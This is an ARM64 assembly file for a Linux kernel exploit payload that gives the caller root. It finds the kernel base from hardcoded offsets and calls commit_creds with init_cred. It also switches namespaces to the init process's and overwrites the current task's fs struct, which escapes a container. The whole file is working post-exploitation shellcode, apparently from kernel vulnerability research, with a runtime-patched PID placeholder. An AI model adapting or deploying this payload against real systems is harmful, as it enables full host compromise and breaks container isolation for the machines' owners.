.section .data

/* Debug kernel offsets
.set x30_kbase_offset, 0x315d68
.set init_cred, 0x1f622d0
.set commit_creds, 0xcc584
.set find_task_by_vpid, 0xc51e0
.set init_nsproxy, 0x1f620a8
.set switch_task_namespaces, 0xca8a8
.set init_fs, 0x1fe7900
.set copy_fs_struct, 0x346de0
*/

.set x30_kbase_offset, 0x34dd20
.set init_cred, 0x20222b8
.set commit_creds, 0xce5f8
.set find_task_by_vpid, 0xc5250
.set init_nsproxy, 0x2022088
.set switch_task_namespaces, 0xcbb6c 
.set init_fs, 0x20a7938
.set copy_fs_struct, 0x384f54

.section .text
.global _start

_start:
        /* backup ret address on the stack */
        sub sp, sp, #0x8
        str x30, [sp]

        /* put kernel base in x27 based on the value in x30 */
        mov x27, x30
        movz x26, x30_kbase_offset & 0xffff
        movk x26, x30_kbase_offset >> 16, lsl 16
        subs x27, x27, x26

        /* commit_creds(init_cred) */
        mov x0, x27
        movz x26, init_cred & 0xffff
        movk x26, (init_cred) >> 16, lsl 16
        add x0, x0, x26

        mov x9, x27
        movz x26, commit_creds & 0xffff
        movk x26, (commit_creds) >> 16, lsl 16
        add x9, x9, x26
        blr x9
        
        /* task = find_task_by_vpid(1) */
        movz x0, 1
        mov x9, x27
        movz x26, find_task_by_vpid & 0xffff
        movk x26, (find_task_by_vpid) >> 16, lsl 16
        add x9, x9, x26
        blr x9
        
        /* switch_task_namespaces(task, init_nsproxy) */
        mov x1, x27
        movz x26, init_nsproxy & 0xffff
        movk x26, (init_nsproxy) >> 16, lsl 16
        add x1, x1, x26
        
        mov x9, x27
        movz x26, switch_task_namespaces & 0xffff
        movk x26, (switch_task_namespaces) >> 16, lsl 16
        add x9, x9, x26
        blr x9

        /* new_fs = copy_fs_struct(init_fs) */
        mov x0, x27
        movz x26, init_fs & 0xffff
        movk x26, (init_fs) >> 16, lsl 16
        add x0, x0, x26

        mov x9, x27
        movz x26, copy_fs_struct & 0xffff
        movk x26, (copy_fs_struct) >> 16, lsl 16
        add x9, x9, x26
        blr x9

        /* backup new_fs */
        mov x25, x0

        /* current = find_task_by_vpid(getpid()) */
        mov x0, 0x4141 /* patched at runtime */
        mov x9, x27
        movz x26, find_task_by_vpid & 0xffff
        movk x26, (find_task_by_vpid) >> 16, lsl 16
        add x9, x9, x26
        blr x9

        /* current->fs = new_fs  */
        str x25, [x0, #0x6d8]

        ldr x30, [sp]
        add sp, sp, #0x8
        ret



        
        

